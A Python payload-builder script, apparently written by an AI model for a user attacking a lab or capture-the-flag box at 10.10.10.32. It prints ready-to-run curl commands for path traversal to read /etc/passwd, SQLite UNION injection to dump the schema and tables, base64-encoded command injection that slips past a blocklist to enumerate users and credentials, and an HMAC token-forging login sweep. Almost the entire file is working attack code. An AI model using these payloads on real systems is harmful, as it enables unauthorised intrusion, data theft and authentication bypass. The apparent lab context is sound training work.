#!/usr/bin/env python3
"""
Convoy orders — JID / Pwn302 (Level 5) — LOCAL scaffold.

Claude never runs this against the box. It is a payload *builder* for the USER
to copy-paste. The default run path only PRINTS ready-to-run curl commands and
executes a pure-logic self-check. No remote()/requests in __main__.

Fill PORT and ENDPOINT once nmap/curl recon reveals them, then pick the helper
matching the confirmed vector (see WRITEUP.md decision tree A/B/C/D).
"""
import base64
import hashlib
import hmac
import shlex

HOST = "10.10.10.32"
PORT = "PORT"          # <- set from nmap-32-full.txt (the BaseHTTPServer port)
ENDPOINT = "ENDPOINT"  # <- set from GET / form action (e.g. enroll, search, login)


def url(path=""):
    return f"http://{HOST}:{PORT}/{path.lstrip('/')}"


# --- Vector A: path traversal -------------------------------------------------
def traversal_probes(param="file", depth=6):
    """curl lines trying several traversal encodings for /etc/passwd."""
    up = "../" * depth
    payloads = [
        f"{up}etc/passwd",
        ("....//" * depth) + "etc/passwd",          # dot-truncation bypass
        f"%2e%2e%2f" * depth + "etc%2fpasswd",      # url-encoded
    ]
    out = [f"curl -sS '{url('docs/' + payloads[0])}' ; echo"]
    for p in payloads:
        out.append(f"curl -sS --data-urlencode '{param}={p}' {url(ENDPOINT)} ; echo")
    return out


# --- Vector B: SQLite injection ----------------------------------------------
def sqli_probes(param="q"):
    tests = [
        "'",                                               # error-confirm
        "' UNION SELECT 1,2-- -",                          # 2-col check
        "' UNION SELECT name,sql FROM sqlite_master-- -",  # schema dump
        "' UNION SELECT col1,col2 FROM TABLE-- -",         # table dump (edit cols/table)
    ]
    return [
        f"curl -sS -X POST {url(ENDPOINT)} --data-urlencode \"{param}={t}\" ; echo"
        for t in tests
    ]


# --- Vector C: base64-gated command injection --------------------------------
def b64cmd(cmd):
    """Encode a shell command the EmbassyGate way (base64, blocklist bypassed)."""
    return base64.b64encode(cmd.encode()).decode()


def cmdinj_probes(field="name"):
    enum = 'id; grep -E "/bin/(ba)?sh$" /etc/passwd; ls -la /home /opt'
    return [
        f"curl -sS --data-urlencode '{field}=ABC' {url(ENDPOINT)} ; echo   # raw: '400 bad encoding'?",
        f"curl -sS --data-urlencode '{field}={b64cmd('id')}' {url(ENDPOINT)} ; echo   # decoded+exec -> uid=...?",
        f"curl -sS --data-urlencode '{field}={b64cmd(enum)}' {url(ENDPOINT)} ; echo   # enumerate user+creds",
    ]


# --- Vector D: HMAC auth forge (pure local compute) --------------------------
ALGOS = {"md5": hashlib.md5, "sha1": hashlib.sha1,
         "sha256": hashlib.sha256, "sha512": hashlib.sha512}


def hmac_token(key: str, msg: str, algo="sha256", enc="hex") -> str:
    """Build one HMAC candidate for p. Deterministic, no network."""
    mac = hmac.new(key.encode(), msg.encode(), ALGOS[algo]).digest()
    if enc == "hex":
        return mac.hex()
    if enc == "HEX":
        return mac.hex().upper()
    if enc == "b64":
        return base64.b64encode(mac).decode()
    if enc == "b64url":
        return base64.urlsafe_b64encode(mac).decode().rstrip("=")
    raise ValueError(enc)


def hmac_candidates(key, msg):
    """All (algo, enc) tokens for one (key,msg) — feed to a curl login sweep."""
    return {
        (a, e): hmac_token(key, msg, a, e)
        for a in ALGOS for e in ("hex", "HEX", "b64", "b64url")
    }


def login_curl(user, token, u_field="u", p_field="p", path="login"):
    return (f"curl -sS -o /dev/null -w '%{{http_code}} {user}\\n' -X POST {url(path)} "
            f"--data-urlencode {shlex.quote(f'{u_field}={user}')} "
            f"--data-urlencode {shlex.quote(f'{p_field}={token}')}")


# --- self-check (pure logic, no target) --------------------------------------
def _selfcheck():
    # Known-answer vector for HMAC-SHA256(key='radar18', msg='admin'), hex.
    expect = hmac.new(b"radar18", b"admin", hashlib.sha256).hexdigest()
    assert hmac_token("radar18", "admin", "sha256", "hex") == expect
    assert hmac_token("radar18", "admin", "sha256", "HEX") == expect.upper()
    # b64url has no padding and decodes back to the raw digest.
    raw = hmac.new(b"k", b"m", hashlib.sha256).digest()
    got = hmac_token("k", "m", "sha256", "b64url")
    assert base64.urlsafe_b64decode(got + "=" * (-len(got) % 4)) == raw
    # b64cmd round-trips.
    assert base64.b64decode(b64cmd("id; ls")).decode() == "id; ls"
    print("[selfcheck] OK")


if __name__ == "__main__":
    _selfcheck()
    print("\n# Fill PORT/ENDPOINT above, then copy the block for the confirmed vector.\n")
    print("## Vector A — traversal:");   print("\n".join(traversal_probes()))
    print("\n## Vector B — SQLi:");       print("\n".join(sqli_probes()))
    print("\n## Vector C — cmd injection:"); print("\n".join(cmdinj_probes()))
    print("\n## Vector D — HMAC login (example key 'radar18', user 'convoy'):")
    toks = hmac_candidates("radar18", "convoy")
    for (a, e), t in list(toks.items())[:4]:
        print(f"#   {a}/{e}: {login_curl('convoy', t)}")
    print("#   (iterate users/keys/msgs locally; only a 200 means a hit — submit nothing unconfirmed)")
